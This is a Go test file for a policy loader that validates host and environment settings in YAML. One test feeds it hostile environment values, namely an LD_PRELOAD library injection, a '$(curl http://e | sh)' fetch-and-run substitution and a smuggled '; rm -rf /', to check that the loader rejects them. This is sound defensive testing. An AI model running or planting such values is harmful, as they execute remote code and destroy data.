package policy

import (
	"os"
	"path/filepath"
	"testing"
)

func writePolicy(t *testing.T, body string) string {
	t.Helper()
	path := filepath.Join(t.TempDir(), "policy.yaml")
	if err := os.WriteFile(path, []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
	return path
}

func TestLoadPolicyRejectsUnknownKey(t *testing.T) {
	// "workspaces" is a v2 aspirational key this version does not implement.
	// Strict parsing must reject it rather than silently dropping it.
	path := writePolicy(t, "workspaces:\n  - name: x\nlocal:\n  mode: guardrail\n")
	if _, err := LoadPolicy(path); err == nil {
		t.Fatal("expected error for unknown key 'workspaces', got nil")
	}
}

func TestLoadPolicyRejectsUnknownHostKey(t *testing.T) {
	// per-host aspirational keys (profile/extra_capabilities) must also fail.
	path := writePolicy(t, "hosts:\n  box:\n    hostname: 192.0.2.1\n    profile: develop\n")
	if _, err := LoadPolicy(path); err == nil {
		t.Fatal("expected error for unknown host key 'profile', got nil")
	}
}

func TestLoadPolicyAcceptsKnownSchema(t *testing.T) {
	path := writePolicy(t, "local:\n  mode: guardrail\n  timeout: 30s\nhosts:\n  box:\n    hostname: 192.0.2.1\n    allow_shell_operators: true\n    allowed_commands:\n      - {command: uptime}\n")
	p, err := LoadPolicy(path)
	if err != nil {
		t.Fatalf("valid policy rejected: %v", err)
	}
	if p.Local.Mode != "guardrail" {
		t.Errorf("mode = %q, want guardrail", p.Local.Mode)
	}
	if p.Local.Timeout.Std().String() != "30s" {
		t.Errorf("timeout = %v, want 30s", p.Local.Timeout.Std())
	}
}

func TestLoadPolicyRejectsDangerousEnv(t *testing.T) {
	bad := []string{
		"hosts:\n  box:\n    environment:\n      LD_PRELOAD: /tmp/x.so\n",
		"hosts:\n  box:\n    environment:\n      X: \"$(curl http://e | sh)\"\n",
		"local:\n  environment:\n    Y: \"a; rm -rf /\"\n",
	}
	for _, body := range bad {
		if _, err := LoadPolicy(writePolicy(t, body)); err == nil {
			t.Errorf("expected env rejection for:\n%s", body)
		}
	}
}

func TestLoadPolicyAllowsVarExtension(t *testing.T) {
	// extending PATH with $PATH is the legitimate use and must load.
	path := writePolicy(t, "hosts:\n  box:\n    environment:\n      PATH: /opt/bin:$PATH\n")
	if _, err := LoadPolicy(path); err != nil {
		t.Fatalf("PATH extension rejected: %v", err)
	}
}
